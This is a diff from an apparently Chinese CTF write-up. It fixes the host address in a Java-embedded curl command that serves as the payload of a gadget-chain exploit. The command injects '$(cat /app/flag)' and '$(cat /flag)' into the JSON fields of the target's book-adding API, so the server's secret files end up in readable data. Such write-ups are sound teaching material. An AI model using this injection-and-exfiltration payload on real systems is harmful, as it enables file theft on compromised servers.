@@ -498,6 +498,6 @@ Host: 127.0.0.1:8080
 只需要将命令改为下方，然后生成链子就好，这样就可以拿到flag了，不过得猜测`flag`到底是文件还是一个形如`readFlag`可执行文件，以及他的路径位置，不过大都是在根目录`/flag`或者`/readFlag`
 
 ```java
-            String cmd = "curl -X POST http://127.0:8080/api/rest/book/addBook -H \"Content-Type: application/json\" -d '{\"bookId\": 1, \"title\": \"'$(cat /app/flag)'\", \"author\": \"'$(cat /flag)'\", \"publishDate\": \"2025-01-01\", \"price\": 13.14}'";
+            String cmd = "curl -X POST http://127.0.0.1:8080/api/rest/book/addBook -H \"Content-Type: application/json\" -d '{\"bookId\": 1, \"title\": \"'$(cat /app/flag)'\", \"author\": \"'$(cat /flag)'\", \"publishDate\": \"2025-01-01\", \"price\": 13.14}'";
 ```
 
